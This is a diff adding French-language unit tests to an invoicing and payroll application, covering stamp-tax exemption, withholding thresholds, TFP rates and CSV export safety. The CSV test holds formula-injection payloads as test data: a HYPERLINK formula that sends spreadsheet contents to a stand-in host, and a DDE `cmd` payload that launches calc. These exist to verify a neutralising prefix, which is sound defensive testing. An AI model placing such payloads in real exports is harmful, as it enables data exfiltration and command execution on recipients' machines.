@@ -11092,6 +11092,184 @@ t('audit A9 : un paquet dont le fichier a disparu se signale', () => {
     assert.ok(/const encore = \$\('#issue'\)/.test(geste), 'le bouton se relit après l\'attente');
   });
 
+  // ---------------------------------------------------------------- 9.1.1 — les corrections fiscales
+
+  t('9.1.1 : un client exonéré décoche le timbre à la CRÉATION, jamais à l\'affichage', () => {
+    // TEST-9.1.1-001/002. La tentation était de lire `client.stampExempt` dans `computeTotals` :
+    // une ligne, et tout marche. Sauf que déclarer un client exonéré six mois plus tard
+    // réécrirait le total de chaque facture déjà émise, envoyée et déclarée — le défaut de la
+    // 7.1.1 sur le timbre, refait un cran plus haut. L'exonération se COPIE sur la pièce.
+    const co = { ...core.DEFAULT_DATA.company, stampFee: 1, currency: 'DT' };
+    const lignes = [{ label: 'Prestation', qty: 1, unitPrice: 1000, vatRate: 0 }];
+    assert.strictEqual(core.computeTotals({ type: 'facture', lines: lignes }, co).stamp, 1);
+    assert.strictEqual(core.computeTotals({ type: 'facture', lines: lignes, applyStamp: false }, co).stamp, 0);
+    // Un avoir ou une proforma n'en portent jamais tant qu'on ne le demande pas : y poser
+    // `applyStamp = true` au nom d'un client NON exonéré en ajouterait un là où il n'y en a pas.
+    ['avoir', 'proforma'].forEach(t => {
+      assert.strictEqual(core.computeTotals({ type: t, lines: lignes }, co).stamp, 0);
+      assert.strictEqual(core.computeTotals({ type: t, lines: lignes, applyStamp: false }, co).stamp, 0);
+    });
+    // Et rien dans le calcul ne va chercher le client : c'est ce qui rend la pièce émise stable.
+    const src = lireSource('src', 'renderer', 'core.js');
+    const zone = src.slice(src.indexOf('const stampApplies'), src.indexOf('const totalTTC'));
+    assert.ok(zone.length > 200 && zone.length < 3000, `tranche du timbre suspecte : ${zone.length}`);
+    assert.ok(!/stampExempt|clientById|clients/.test(zone),
+      'computeTotals ne doit JAMAIS relire le client : une pièce émise ne bouge plus');
+
+    // Côté écran, la copie se fait dans les DEUX sens et seulement sur une facture.
+    const app = lireApp();
+    const acd = app.slice(app.indexOf('function applyClientDefaults'), app.indexOf('function clientWithholding'));
+    assert.ok(acd.length > 100, 'applyClientDefaults introuvable');
+    assert.ok(/doc\.type === 'facture'\) doc\.applyStamp = !c\.stampExempt/.test(acd),
+      'l\'exonération doit se poser ET se retirer, et seulement sur une facture');
+    // Et l'écran suit : sans ça, le prochain `formValues` relit la case restée en arrière.
+    assert.ok(/caseTimbre[\s\S]{0,200}?checked = doc\.applyStamp !== false/.test(app),
+      'la case du timbre ne suit pas le changement de client');
+    assert.ok(/name="stampExempt"/.test(app), 'la case n\'est pas sur la fiche client');
+  });
+
+  t('9.1.1 : le seuil de retenue vaut 0, 0 ne prévient jamais, et sous le seuil on AVERTIT', () => {
+    // TEST-9.1.1-003/004/005. La valeur par défaut d'une règle qu'on ne connaît pas est celle qui
+    // ne fait rien : deux relectures extérieures proposaient « par défaut 1 000 DT ». Ce serait
+    // écrire une règle de droit que personne n'a confirmée.
+    assert.strictEqual(core.seuilRetenue({}), 0);
+    assert.strictEqual(core.seuilRetenue(), 0);
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: '' }), 0);
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: 1000 }), 1000);
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: '1500,5' }), 0, 'une saisie illisible ne fabrique pas un seuil');
+    // Le SEUL cas que la garde protège vraiment : `Number('') === 0` rend l'assertion évidente
+    // inutile, et 0 est déjà la valeur neutre (leçon de la 8.3.0).
+    assert.strictEqual(core.seuilRetenue({ withholdingThreshold: -1000 }), 0, 'un seuil négatif est ignoré');
+
+    // L'avertissement AVERTIT : il vit dans `issueWarnings`, jamais dans `issue()` ni dans
+    // `validate()`. Un refus empêcherait d'émettre une facture parfaitement légale.
+    const app = lireApp();
+    // `lireApp()` RETIRE les commentaires de ligne : une tranche ne peut jamais s'ancrer sur un
+    // commentaire, seulement sur du code (piège de la 8.2.0, re-rencontré).
+    const iw = app.slice(app.indexOf('function issueWarnings()'), app.indexOf('async function premierEnvoiOk()'));
+    assert.ok(iw.length > 500 && iw.length < 6000, `tranche d'issueWarnings suspecte : ${iw.length}`);
+    assert.ok(/C\.seuilRetenue\(co\)/.test(iw) && /seuil > 0/.test(iw),
+      'l\'avertissement du seuil doit vivre dans issueWarnings');
+    assert.ok(/w\.push\(`Cette facture/.test(iw), 'il doit AVERTIR (w.push), pas refuser');
+    assert.ok(!/return false|refus\(/.test(iw), 'issueWarnings ne refuse rien, jamais');
+    // Et nulle part ailleurs : c'est ce qui garantit qu'il ne devient pas un blocage en passant.
+    assert.strictEqual((app.match(/seuilRetenue/g) || []).length, 1,
+      'le seuil ne se lit qu\'à un seul endroit de l\'interface');
+  });
+
+  t('9.1.1 : la TFP est PROPOSÉE par le métier, jamais écrite sans le comptable', () => {
+    // TEST-9.1.1-006/007. Le test est écrit pour TOMBER si quelqu'un ajoute un `tfp:` à ACTIVITIES
+    // sans avoir la réponse. C'est un chiffre qui part sur les bulletins de salariés réels.
+    core.ACTIVITIES.forEach(a => {
+      assert.strictEqual(a.tfp, undefined,
+        `« ${a.label} » porte une TFP en dur : aucun métier n'en a une tant que le comptable n'a pas tranché`);
+      assert.strictEqual(core.tfpSuggere(a.id), null);
+    });
+    assert.strictEqual(core.tfpSuggere('informatique'), null);
+    assert.strictEqual(core.tfpSuggere('metier-qui-n-existe-pas'), null);
+    assert.strictEqual(core.tfpSuggere(), null);
+
+    // Le mécanisme, lui, existe et se prouve sur un métier fabriqué pour le test.
+    const faux = { id: '__essai__', label: 'Essai', catalog: [], tfp: 1 };
+    core.ACTIVITIES.push(faux);
+    try {
+      assert.strictEqual(core.tfpSuggere('__essai__'), 1);
+      const d = { company: { activity: '__essai__' }, payrollSettings: {} };
+      assert.strictEqual(core.payrollSettings(d).tfpRate, 1, 'la proposition doit s\'appliquer');
+      // Et elle n'écrase JAMAIS un choix : ni un taux saisi, ni un champ touché.
+      assert.strictEqual(core.payrollSettings({ ...d, payrollSettings: { tfpRate: 2 } }).tfpRate, 2);
+      assert.strictEqual(core.payrollSettings({ ...d, payrollSettings: { tfpTouche: true } }).tfpRate,
+        core.DEFAULT_PAYROLL.tfpRate, 'un champ touché reprend la valeur livrée, pas la proposition');
+      // `0` est un taux légitime : un `||` le remplacerait par la proposition.
+      assert.strictEqual(core.payrollSettings({ ...d, payrollSettings: { tfpRate: 0 } }).tfpRate, 0);
+    } finally { core.ACTIVITIES.pop(); }
+
+    // Enregistrer les barèmes, c'est avoir décidé (motif `regimeTouche`, 7.25.0/7.30.0).
+    const app = lireApp();
+    assert.ok(/brackets: b, tfpTouche: true/.test(app),
+      'enregistrer les barèmes doit poser tfpTouche, sinon la proposition revient écraser le taux');
+    assert.ok(/const tfpPropose = C\.tfpSuggere\(company\(\)\.activity\)/.test(app), 'l\'écran ne lit pas la proposition');
+    assert.ok(/tfpPropose !== null \?/.test(app), 'la mention doit disparaître quand il n\'y a rien à proposer');
+  });
+
+  t('9.1.1 : les deux nouvelles bulles existent, et le contrôle e-facture est écrit', () => {
+    // TEST-9.1.1-008/009. Un champ neuf sans bulle est un champ que personne ne comprend — et ici
+    // les deux portent un « À VÉRIFIER », parce que ce sont des règles de droit.
+    const guide = lireSource('src', 'renderer', 'guide.js');
+    ['client.stampExempt', 'doc.withholdingThreshold'].forEach(k => {
+      assert.ok(guide.includes(`'${k}':`), `la bulle ${k} manque`);
+    });
+    const bulles = require('../src/renderer/guide.js').INFO;
+    ['client.stampExempt', 'doc.withholdingThreshold'].forEach(k => {
+      assert.ok(/VÉRIFIER/.test(bulles[k].d), `la bulle ${k} doit porter son « À VÉRIFIER »`);
+    });
+
+    // Le contrôle e-facture est un DOCUMENT, pas du code : il dit, champ par champ, si notre
+    // modèle porte ce qu'un format officiel exigerait. C'est ce qui permettra de décider si
+    // l'export TEIF est un chantier d'une semaine ou de trois mois, le jour où l'obligation
+    // tombera — au lieu de le découvrir ce jour-là.
+    const doc = fs.readFileSync(path.join(__dirname, '..', 'docs', 'e-facture-controle.md'), 'utf8');
+    assert.ok(doc.length > 3000, 'le contrôle e-facture est trop court pour dire quoi que ce soit');
+    const lignes = doc.split('\n').filter(l => /^\|/.test(l) && /\|\s*(oui|non|partiel)\b/i.test(l));
+    assert.ok(lignes.length >= 25, `seulement ${lignes.length} champ(s) contrôlé(s)`);
+    assert.ok(/À VÉRIFIER/.test(doc), 'un document sur un format officiel qu\'on n\'a pas lu porte son « À VÉRIFIER »');
+  });
+
+  t('9.1.1 : une formule CSV est neutralisée, et aucun montant ne bouge', () => {
+    // TEST-9.1.1-010. Un tableur EXÉCUTE une cellule qui commence par `=`, `+`, `-` ou `@`. Nos
+    // exports partent chez le comptable, et leurs libellés viennent de qui tape la facture :
+    // `=HYPERLINK("http://x?"&A1)` dans un libellé faisait partir le contenu de sa balance vers
+    // une adresse choisie par quelqu'un d'autre, sans que rien ne plante.
+    const Compta = require('../src/renderer/compta.js');
+    const cab = require('../src/cabinet/cabcore.js');
+    // La parade est STRICTE : elle ne devine pas ce qui « ressemble à un nombre ». C'est
+    // l'appelant qui sait — `core.toCsv` a des types de colonnes, le cabinet non. Sans cette
+    // séparation, `+216 71 123 456` (un téléphone) passerait pour un montant et ressortirait
+    // évalué en `#NOM?` : aucune règle ne distingue un téléphone d'un montant.
+    const cases = [
+      ['=1+1', true], ['=HYPERLINK("http://x")', true], ['+216 71 123 456', true],
+      ['@SUM(A1:A9)', true], ['\t=cmd', true], ['\r=cmd', true],
+      ['-Alpha SARL', true], ['-DUPONT', true], ['-12,500', true],
+      ['Alpha SARL', false], ['', false], ['Devis n° 12', false], ['1234', false]
+    ];
+    cases.forEach(([v, attendu]) => {
+      assert.strictEqual(Compta.csvDangereux(v), attendu, `csvDangereux(${JSON.stringify(v)})`);
+      assert.strictEqual(cab.csvDangereux(v), attendu, `cabcore.csvDangereux(${JSON.stringify(v)})`);
+    });
+
+    // Par le vrai chemin des deux applications, pas seulement par la fonction.
+    const csv = core.toCsv(
+      [{ nom: '=cmd|\' /C calc\'!A0', mt: -12.5, d: '2026-03-04', note: '-Alpha' }],
+      [{ key: 'nom', label: 'Client' }, { key: 'mt', label: 'Montant', type: 'money' },
+       { key: 'd', label: 'Date', type: 'date' }, { key: 'note', label: 'Note' }]);
+    const ligne = csv.split('\r\n')[1];
+    assert.ok(ligne.includes('\'=cmd'), 'la formule doit être préfixée : ' + ligne);
+    assert.ok(ligne.includes('-12,500'), 'un montant négatif reste un montant : ' + ligne);
+    assert.ok(ligne.includes('04/03/2026'), 'une date n\'est jamais touchée : ' + ligne);
+    assert.ok(ligne.includes(';\'-Alpha'), 'un nom qui commence par un tiret passe par la parade : ' + ligne);
+
+    // Et l'exception numérique du cabinet, qui n'existe QUE là : ses cellules arrivent déjà mises
+    // en forme et il n'a aucun type pour dire lesquelles sont des montants. Un `-12,500` préfixé,
+    // c'est une colonne que le comptable ne peut plus additionner.
+    assert.strictEqual(cab.toCsvLine(['=1+1', '-12,500', '+1 200,000', 'Alpha']),
+      '\'=1+1;-12,500;+1 200,000;Alpha');
+
+    // Les DEUX corps, au caractère près : cabcore ne charge pas compta.js (il est requis par
+    // main.js, par le renderer et par les tests). Deux parades qui divergent, c'est celle qu'on a
+    // oubliée qui laisse passer. Même règle que `round3` en 9.1.0.
+    const corps = src => (src.match(/function csvDangereux\(cellule\) \{[\s\S]*?\n  \}/) || [''])[0];
+    const a = corps(lireSource('src', 'renderer', 'compta.js'));
+    const b = corps(lireSource('src', 'cabinet', 'cabcore.js'));
+    assert.ok(a && a === b, `csvDangereux diverge :\n  compta  : ${a}\n  cabcore : ${b}`);
+
+    // Et le quatrième export — le portefeuille du cabinet — ne doit plus avoir sa propre version.
+    const cabapp = lireSource('src', 'cabinet', 'renderer', 'app.js');
+    const zone = cabapp.slice(cabapp.indexOf('function toCsv(cols, rows)'), cabapp.indexOf('function toCsv(cols, rows)') + 400);
+    assert.ok(zone.length > 100, 'toCsv du cabinet introuvable');
+    assert.ok(/K\.toCsvLine/.test(zone), 'l\'export du portefeuille doit passer par la porte unique');
+    assert.ok(!/replace\(\/"\/g/.test(zone), 'il ne doit plus échapper lui-même : c\'est la version sans parade');
+  });
+
   if (enCours) throw new Error(`${enCours} test(s) asynchrone(s) lancé(s) sans « await ta(…) » : ils ne peuvent plus échouer`);
   console.log(`\n${n} tests OK`);
 })().catch(e => { console.error(e); process.exit(1); });
